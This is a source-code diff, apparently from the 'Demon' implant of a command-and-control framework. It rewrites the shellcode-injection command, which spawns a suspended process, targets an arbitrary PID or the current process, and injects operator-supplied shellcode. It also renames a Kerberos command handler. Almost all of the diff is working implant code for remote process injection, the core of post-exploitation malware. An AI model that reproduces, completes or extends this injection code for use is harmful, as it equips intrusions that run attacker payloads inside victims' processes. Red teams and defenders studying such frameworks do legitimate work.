@@ -34,7 +34,7 @@ SEC_DATA DEMON_COMMAND DemonCommands[] = {
         { .ID = DEMON_COMMAND_TOKEN,                    .Function = CommandToken                    },
         { .ID = DEMON_COMMAND_TRANSFER,                 .Function = CommandTransfer                 },
         { .ID = DEMON_COMMAND_SOCKET,                   .Function = CommandSocket                   },
-        { .ID = DEMON_COMMAND_KERBEROS,                 .Function = Commandkerberos                 },
+        { .ID = DEMON_COMMAND_KERBEROS,                 .Function = CommandKerberos                 },
         { .ID = DEMON_COMMAND_MEM_FILE,                 .Function = CommandMemFile                  },
         { .ID = DEMON_EXIT,                             .Function = CommandExit                     },
 
@@ -1200,54 +1200,105 @@ VOID CommandSpawnDLL( PPARSER Parser )
     PackageTransmit( Package, NULL, NULL );
 }
 
-VOID CommandInjectShellcode( PPARSER Parser )
-{
-    PPACKAGE      Package        = PackageCreate( DEMON_COMMAND_INJECT_SHELLCODE );
-    UINT32        ShellcodeSize  = 0;
-    UINT32        ArgumentSize   = 0;
-    BOOL          Inject         = ( BOOL )  ParserGetInt32( Parser );
-    SHORT         Technique      = ( SHORT ) ParserGetInt32( Parser );
-    SHORT         TargetArch     = ( SHORT ) ParserGetInt32( Parser );
-    PVOID         ShellcodeBytes = ParserGetBytes( Parser, &ShellcodeSize );
-    PVOID         ShellcodeArgs  = ParserGetBytes( Parser, &ArgumentSize );
-    DWORD         TargetPID      = ParserGetInt32( Parser );
-    DWORD         Result         = ERROR_SUCCESS;
-    INJECTION_CTX InjectionCtx   = {
-        .ProcessID     = TargetPID,
-        .hThread       = NULL,
-        .Arch          = TargetArch,
-        .Parameter     = ShellcodeArgs,
-        .ParameterSize = ArgumentSize,
-    };
+VOID CommandInjectShellcode(
+    IN PPARSER Parser
+) {
+    PPACKAGE  Package = NULL;
+    DWORD     Status  = INJECT_ERROR_FAILED;
+    DWORD     Way     = FALSE;
+    DWORD     Method  = 0;
+    BOOL      x64     = FALSE;
+    PVOID     Payload = NULL;
+    DWORD     Size    = 0;
+    PVOID     Argv    = NULL;
+    DWORD     Argc    = 0;
+    DWORD     Pid     = 0;
+    LPSTR     Spawn   = NULL;
+    PROC_INFO PcInfo  = { 0 };
 
-    PRINTF( "Inject[%s] Technique[%d] TargetPID:[%d] TargetProcessArch:[%d] ShellcodeSize:[%d]\n", Inject ? "TRUE" : "FALSE", Technique, TargetPID, TargetArch, ShellcodeSize );
+    /* create response package */
+    Package = PackageCreate( DEMON_COMMAND_INJECT_SHELLCODE );
 
-    if ( Inject == 1 )
+    /* parse arguments */
+    Way     = ParserGetInt32( Parser );
+    Method  = ParserGetInt32( Parser );
+    x64     = ParserGetInt32( Parser );
+    Payload = ParserGetBytes( Parser, &Size );
+    Argv    = ParserGetBytes( Parser, &Argc );
+    Pid     = ParserGetInt32( Parser );
+
+    PRINTF(
+        "Injection Args:      \n"
+        " - Way     : %d      \n"
+        " - Method  : %d      \n"
+        " - x64     : %s      \n"
+        " - Payload : %p : %d \n"
+        " - Arg     : %p : %d \n"
+        " - Pid     : %d      \n",
+        Way,
+        Method,
+        x64 ? "TRUE" : "FALSE",
+        Payload, Size,
+        Argv, Argc,
+        Pid
+    )
+
+    /* dispatch injection way */
+    switch ( Way )
     {
-        /* TODO: instead of using PROCESS_ALL_ACCESS only use VM_OPERATION & PROCESS_CREATE_THREAD */
-        if ( ( InjectionCtx.hProcess = ProcessOpen( TargetPID, PROCESS_ALL_ACCESS ) ) == INVALID_HANDLE_VALUE ) {
-            PACKAGE_ERROR_WIN32
-            return;
+        case INJECT_WAY_SPAWN: PUTS( "INJECT_WAY_SPAWN" ) {
+            /* use configured target process */
+            if ( x64 ) {
+                Spawn = Instance.Config.Process.Spawn64;
+            } else {
+                Spawn = Instance.Config.Process.Spawn86;
+            }
+
+            PRINTF( "Target spawn process: %s\n", Spawn )
+
+            /* create process */
+            if ( ProcessCreate( ( ! x64 ), NULL, Spawn, CREATE_NO_WINDOW | CREATE_NEW_CONSOLE | CREATE_SUSPENDED, &PcInfo, FALSE, NULL ) ) {
+                PRINTF( "ProcessId is %d\n", PcInfo.dwProcessId );
+
+                /* inject code */
+                Status = Inject( Method, PcInfo.hProcess, 0, x64, Payload, Size, U_PTR( NULL ), Argv, Argc );
+
+                /* close process handle */
+                if ( PcInfo.hProcess ) {
+                    SysNtClose( PcInfo.hProcess );
+                }
+
+                /* close thread handle */
+                if ( PcInfo.hThread ) {
+                    SysNtClose( PcInfo.hThread );
+                }
+
+                /* clear struct from stack */
+                RtlSecureZeroMemory( &PcInfo, sizeof( PROC_INFO ) );
+            } else {
+                PRINTF( "Failed to create process: %d\n", NtGetLastError() )
+            }
+
+            break;
         }
-    } else if ( Inject == 2 ) {
-        InjectionCtx.hProcess = NtCurrentProcess();
+
+        case INJECT_WAY_INJECT: PUTS( "INJECT_WAY_INJECT" ) {
+            Status = Inject( Method, NULL, Pid, x64, Payload, Size, U_PTR( NULL ),Argv, Argc );
+            break;
+        }
+
+        case INJECT_WAY_EXECUTE: PUTS( "INJECT_WAY_EXECUTE" ) {
+            Status = Inject( Method, NtCurrentProcess(), 0, x64, Payload, Size, U_PTR( NULL ),Argv, Argc );
+            break;
+        }
+
+        default: {
+            PRINTF( "Injection way not found: %d\n", Way )
+        }
     }
 
-    Technique = Technique == 0 ? Instance.Config.Inject.Technique : Technique; // if the teamserver specified 0 ==> means that it should use the technique from the config
 
-    PRINTF( "Technique going to be used => %d\n", Technique )
-
-    Result = ShellcodeInjectDispatch(
-        Inject,
-        Technique,
-        ShellcodeBytes,
-        ShellcodeSize,
-        &InjectionCtx
-    );
-
-    PRINTF( "Injection Result => %d", Result )
-
-    PackageAddInt32( Package, Result );
+    PackageAddInt32( Package, Status );
     PackageTransmit( Package, NULL, NULL );
 }
 
@@ -2934,8 +2985,9 @@ VOID CommandSocket( PPARSER Parser )
     PackageTransmit( Package, NULL, NULL );
 }
 
-VOID Commandkerberos( PPARSER Parser )
-{
+VOID CommandKerberos(
+    IN PPARSER Parser
+) {
     PPACKAGE     Package = NULL;
     DWORD        Command = 0;
     HANDLE       hToken  = TokenCurrentHandle();
